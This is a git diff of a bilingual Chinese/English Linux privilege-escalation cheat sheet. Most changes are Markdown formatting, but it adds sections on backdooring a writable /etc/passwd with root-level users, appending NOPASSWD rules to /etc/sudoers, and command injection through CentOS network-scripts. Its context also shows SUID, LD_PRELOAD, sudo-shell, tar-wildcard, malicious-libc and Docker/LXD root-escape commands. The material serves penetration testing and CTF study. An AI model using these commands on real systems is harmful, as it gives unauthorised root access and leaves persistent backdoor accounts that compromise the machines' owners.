@@ -4,21 +4,21 @@
 * [搜集项](#搜集项)
 * 提权方法
   * [Looting for passwords](#looting-for-passwords)
-    * [Files containing passwords](#files-containing-passwords)
-    * [Old passwords in /etc/security/opasswd](#old-passwords-in--etc-security-opasswd)
-    * [Last edited files](#last-edited-files)
-    * [In memory passwords](#in-memory-passwords)
-    * [Find sensitive files](#find-sensitive-files)
+    * Files containing passwords
+    * Old passwords in /etc/security/opasswd
+    * Last edited files
+    * In memory passwords
+    * Find sensitive files
   * [Scheduled tasks](#scheduled-tasks)
-    * [Cron jobs](#cron-jobs)
-    * [Systemd timers](#systemd-timers)
+    * Cron jobs
+    * Systemd timers
   * [SUID](#suid)
     * [Find SUID binaries](#find-suid-binaries)
     * [Create a SUID binary](#create-a-suid-binary)
   * [Capabilities](#capabilities)
-    * [List capabilities of binaries](#list-capabilities-of-binaries)
-    * [Edit capabilities](#edit-capabilities)
-    * [Interesting capabilities](#interesting-capabilities)
+    * List capabilities of binaries
+    * Edit capabilities
+    * Interesting capabilities
   * [SUDO](#sudo)
     * [NOPASSWD](#nopasswd)
     * [LD_PRELOAD and NOPASSWD](#ld-preload-and-passwd)
@@ -45,19 +45,19 @@
 #### linux提权之前的基本判断
 
 查看管理员是否在线
-```
+```shell
 w
 ```
 
 虚拟机检测
-```
+```shell
 # check VM(virtual machine)
 # 如果有结果则为虚拟机
 cat /proc/cpuinfo | grep -q "hypervisor"
 ```
 
 连接管理
-```
+```shell
 # Connected IP Addresses:
 # 查看与当前主机建立连接的IP  (以root权限执行命令)
 netstat -anpt | grep ESTABLISHED | awk '{ print $5 }' | cut -d: -f1 | sort -u
@@ -149,12 +149,13 @@ iptables -A INPUT -s 1.1.1.1 -j DROP
 
 ### Checklists - linux 提权方法
 
+----
 
 #### Looting for passwords
 
 密码搜集
 
-```
+```shell
 # ---------------
 # 查找包含密码的文件
 # Files containing passwords
@@ -197,12 +198,13 @@ $ locate password | less
 
 如果主机上部署了web应用等代码,可以考虑从代码中搜集敏感信息(IP 域名 凭证)
 
+----
 
 #### Scheduled tasks
 
 计划任务
 
-```
+```shell
 # ---------------
 # Cron jobs
 
@@ -245,9 +247,11 @@ Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 d
 3 timers listed.
 ```
 
+----
+
 #### SUID
 
-```
+```shell
 # SUID/Setuid代表 "执行时设置用户ID"
 # 它默认情况下在每个Linux发行版中都启用.
 # 如果运行某个具有这个bit位的文件,则uid将被属主owner更改掉.
@@ -265,8 +269,10 @@ Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 d
 -rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
 ```
 
-Find SUID binaries
-```
+
+##### Find SUID binaries
+
+```shell
 # 寻找已有的 SUID二进制程序
 
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
@@ -283,8 +289,9 @@ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 ```
 
 
-Create a SUID binary
-```
+##### Create a SUID binary
+
+```shell
 # 创建一个 SUID二进制程序的过程
 
 # 1. 写c源代码文件 suid.c
@@ -310,13 +317,15 @@ sudo chmod +x /tmp/suid # + 执行权限(execute right)
 sudo chmod +s /tmp/suid # + setuid bit
 ```
 
+----
+
 #### Capabilities
 
 功能
 
 搜索 Linux Capabilities
 
-```
+```shell
 # ---------------
 # List capabilities of binaries
 # 列出二进制文件的功能 使用getcap命令
@@ -373,11 +382,11 @@ sh-5.0# id
 uid=0(root) gid=1000(swissky)
 ```
 
+----
 
 #### SUDO
 
-
-NOPASSWD
+##### NOPASSWD
 
 ```shell
 # Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
@@ -398,7 +407,7 @@ sudo vim -c '!sh'
 sudo -u root vim -c '!sh'
 ```
 
-LD_PRELOAD and NOPASSWD
+##### LD_PRELOAD and NOPASSWD
 
 ```shell
 # If LD_PRELOAD is explicitly defined in the sudoers file
@@ -431,7 +440,7 @@ sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
 
-Doas
+##### Doas
 ```
 # There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf
 # 有一些二进制程序 可以替代 sudo这个二进制程序，比如OpenBSD的doas，记得在/etc/doas.conf检查它的配置，如
@@ -441,7 +450,7 @@ permit nopass demo as root cmd vim
 
 
 
-sudo_inject
+##### sudo_inject
 
 ```
 # Using https://github.com/nongiach/sudo_inject
@@ -466,6 +475,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf
 
+----
 
 #### GTFOBins
 
@@ -482,6 +492,7 @@ strace -o /dev/null /bin/sh
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
+----
 
 #### Wildcard
 
@@ -504,13 +515,72 @@ echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
 tar cf archive.tar *
 ```
 
+----
 
 #### Writable files
 
-可写文件
+列出系统中的可写文件
+```shell
+find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find / -perm -2 -type f 2>/dev/null
+find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
 ```
-find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+
+##### Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
+
+/etc/sysconfig/network-scripts/ifcfg-1337 for example
+
+```shell
+NAME=Network /bin/id  &lt;= Note the blank space
+ONBOOT=yes
+DEVICE=eth0
+
+EXEC :
+./etc/sysconfig/network-scripts/ifcfg-1337
 ```
+src : https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f
+
+##### Writable /etc/passwd
+
+First generate a password with one of the following commands.
+
+```shell
+openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+```
+
+Then add the user `hacker` and add the generated password.
+
+```shell
+hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+```
+
+E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+
+You can now use the `su` command with `hacker:hacker`
+
+Alternatively you can use the following lines to add a dummy user without a password.    
+WARNING: you might degrade the current security of the machine.
+
+```shell
+echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+su - dummy
+```
+
+NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 
+
+##### Writable /etc/sudoers
+
+```shell
+echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
+
+# use SUDO without password
+echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+```
+
+----
 
 #### NFS Root Squashing
 
@@ -518,7 +588,7 @@ When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a
 
 当no_root_squash出现在`/etc/exports`中时，该文件夹是可共享的，远程用户可以挂载它
 
-```
+```shell
 # create dir
 mkdir /tmp/nfsdir  
 
@@ -533,13 +603,15 @@ cp /bin/bash .
 chmod +s bash 	
 ```
 
+----
+
 #### Shared Library
 
 * 方法1 ldconfig - Identify shared libraries with `ldd`
 
 使用`ldd`识别共享库
 
-```
+```shell
 $ ldd /opt/binary
     linux-vdso.so.1 (0x00007ffe961cd000)
     vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
@@ -550,7 +622,7 @@ Create a library in `/tmp` and activate the path.
 
 在`/tmp`中创建一个库并激活路径
 
-```
+```shell
 gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
 echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
 /opt/binary
@@ -558,7 +630,7 @@ echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
 
 * 方法2 RPATH
 
-```
+```shell
 level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
  0x00000001 (NEEDED)                     Shared library: [libc.so.6]
  0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
@@ -571,7 +643,7 @@ level15@nebula:/home/flag15$ ldd ./flag15
 
 By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.
 
-```
+```shell
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
 
 level15@nebula:/home/flag15$ ldd ./flag15 
@@ -582,7 +654,7 @@ level15@nebula:/home/flag15$ ldd ./flag15
 
 Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
 
-```
+```c
 #include<stdlib.h>
 #define SHELL "/bin/sh"
 
@@ -595,26 +667,28 @@ int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp
 }
 ```
 
+----
+
 #### Groups
 
 * 环境 - Docker
 
 Mount the filesystem in a bash container, allowing you to edit the `/etc/passwd` as root, then add a backdoor account `toor:password`.
 
-```bash
+```shell
 $> docker run -it --rm -v $PWD:/mnt bash
 $> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
 ```
 
 Almost similar but you will also see all processes running on the host and be connected to the same NICs.
 
-```
+```shell
 docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
 ```
 
 Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell
 
-```
+```shell
 $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
 latest: Pulling from chrisfosterelli/rootplease
 2de59b831a23: Pull complete 
@@ -634,7 +708,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 More docker privilege escalation using the Docker Socket.
 
-```
+```shell
 sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
@@ -645,7 +719,7 @@ The privesc requires to run a container with elevated privileges and mount the h
 
 这个提权方法要求运行一个已经提权过的容器 把需要提权的主机文件系统挂载到其中
 
-```
+```shell
 ╭─swissky@lab ~  
 ╰─$ id
 uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
@@ -655,7 +729,7 @@ Build an Alpine image and start it using the flag `security.privileged=true`, fo
 
 构建一个Alpine镜像 并使用`security.privileged=true`参数启动 强制容器以root权限与主机文件系统交互
 
-```
+```shell
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
 ./build-alpine -a i686
@@ -677,12 +751,16 @@ lxc exec mycontainer /bin/sh
 Alternatively https://github.com/initstring/lxd_root
 
 
+----
+
 #### root进程
 
 * 以root权限运行的进程
   * MySQL UDF提权
   * redis 未授权 - 利用crontab写定时任务 getshell(该shell继承redis权限)
   * ...
+
+----
 
 #### Kernel Exploits
 
